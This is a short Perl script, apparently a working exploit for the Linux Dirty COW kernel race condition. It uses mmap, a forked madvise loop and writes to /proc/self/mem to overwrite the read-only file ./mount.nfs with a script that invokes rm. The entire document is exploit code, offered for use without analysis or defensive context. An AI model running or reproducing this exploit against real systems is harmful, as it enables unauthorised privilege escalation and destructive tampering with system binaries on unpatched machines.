#!/usr/bin/env perl
# working_dirtycow.pl 
open(t,"<./mount.nfs");
# __NR_mmap2     9
# __NR_madvise  28
# __NR_pwrite64 18

#addr
$s="syscall ";
$a=eval $s."9,0,4096,1,2,3,0";
open(x,'+</proc/self/mem');
$i=999;
$y=999;
if(fork){while(--$y){eval$s."28,\$a,1,4"};}
while(syscall(18,4,$k="#!./bin/rm\nexit\n",--$i,$a)){}

